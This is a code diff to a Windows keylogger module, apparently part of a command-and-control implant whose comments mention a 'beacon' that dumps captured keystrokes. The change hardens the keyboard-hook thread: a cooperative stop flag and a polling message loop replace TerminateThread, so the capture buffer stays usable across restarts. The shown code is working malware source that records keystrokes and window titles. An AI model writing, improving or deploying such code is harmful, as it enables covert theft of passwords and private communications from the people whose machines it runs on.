@@ -46,6 +46,12 @@ inline HHOOK g_hhook = NULL;
 inline HANDLE g_hook_thread = NULL;
 inline DWORD g_hook_tid = 0;
 
+// Cooperative shutdown flag. The hook thread polls this instead of being
+// terminated: TerminateThread() while hook_proc holds key_lock (it takes the
+// spinlock on every keystroke) abandons the lock forever, so the buffer can
+// never be dumped again — the beacon looks alive and silently is not.
+inline std::atomic<bool> g_stop{false};
+
 // ── Helpers ─────────────────────────────────────────────────────
 inline std::string GetActiveWindowTitle() {
     HWND hForeground = GetForegroundWindow();
@@ -183,13 +189,24 @@ inline void poll() {
 }
 
 // ── Hook Thread ──────────────────────────────────
+// Cooperative stop: the loop observes g_stop at least every 200 ms instead of
+// blocking in GetMessageW forever. stop() (and the restart path of start())
+// sets the flag and posts WM_QUIT, then waits a bounded time — it never calls
+// TerminateThread(), which would abandon the spinlock held by hook_proc.
 inline DWORD WINAPI hook_thread(LPVOID) {
     g_hhook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, GetModuleHandleW(NULL), 0);
     if (!g_hhook) return 1;
     MSG msg;
-    while (GetMessageW(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
+    while (!g_stop.load()) {
+        if (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
+            if (msg.message == WM_QUIT) break;
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        } else {
+            // No message pending: wait a bounded slice so the stop flag is
+            // honoured even when the desktop is idle.
+            MsgWaitForMultipleObjects(0, nullptr, FALSE, 200, QS_ALLINPUT);
+        }
     }
     UnhookWindowsHookEx(g_hhook);
     g_hhook = NULL;
@@ -201,9 +218,9 @@ inline std::string start() {
     if (is_running) {
         is_running = false;
         if (g_hhook) {
+            g_stop.store(true);
             PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
-            if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT)
-                TerminateThread(g_hook_thread, 0);
+            WaitForSingleObject(g_hook_thread, 5000);
             CloseHandle(g_hook_thread);
             g_hook_thread = NULL;
         }
@@ -214,6 +231,7 @@ inline std::string start() {
     last_title[0] = '\0';
     key_lock = 0;
     g_hhook = NULL;
+    g_stop.store(false);
 
     g_hook_thread = CreateThread(NULL, 0, hook_thread, NULL, 0, &g_hook_tid);
     if (!g_hook_thread) return "Keylogger start FAILED (CreateThread).";
@@ -235,10 +253,9 @@ inline std::string stop() {
     if (!is_running) return "Keylogger is not running.";
     is_running = false;
     if (g_hhook) {
+        g_stop.store(true);
         PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
-        if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT) {
-            TerminateThread(g_hook_thread, 0);
-        }
+        WaitForSingleObject(g_hook_thread, 5000);
         CloseHandle(g_hook_thread);
         g_hook_thread = NULL;
     }
